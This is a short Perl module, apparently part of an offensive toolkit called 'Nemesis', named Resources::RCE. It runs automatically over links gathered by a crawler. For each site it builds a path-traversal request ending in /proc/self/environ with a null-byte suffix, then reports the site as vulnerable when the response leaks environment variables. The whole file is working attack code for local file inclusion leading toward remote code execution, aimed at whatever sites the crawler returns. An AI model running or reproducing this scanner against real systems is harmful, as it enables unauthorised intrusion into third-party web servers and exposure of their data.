package Resources::RCE;

use Moose;
use Nemesis::Inject;

has 'Crawler' => ( is => "rw" );
has 'Bug'     => ( is => "rw" );
has 'Test'    => ( is => "rw", default => "/proc/self/environ" );
has 'TestRegex' =>
    ( is => "rw", default => "DOCUMENT_ROOT=\/|HTTP_USER_AGENT" );

nemesis resource { 1; } use LWP::Simple;

sub test() {
    my $self = shift;
    my @URLS = @{ $self->Crawler->stripLinks };
    foreach my $url (@URLS) {
        $self->Init->getIO()->print_info("Trying against $url");
        my $Test =
              "http://"
            . $url
            . $self->Bug
            . "../../../../../../../../../../../../../"
            . $self->Test . "%0000";
        my $Content = get($Test);
        my $r       = $self->TestRegex;
        if ( $Content =~ /$r/i ) {
            $self->Init->getIO()->print_info( $Test . " is vulnerable" );
        }
    }
}

1;
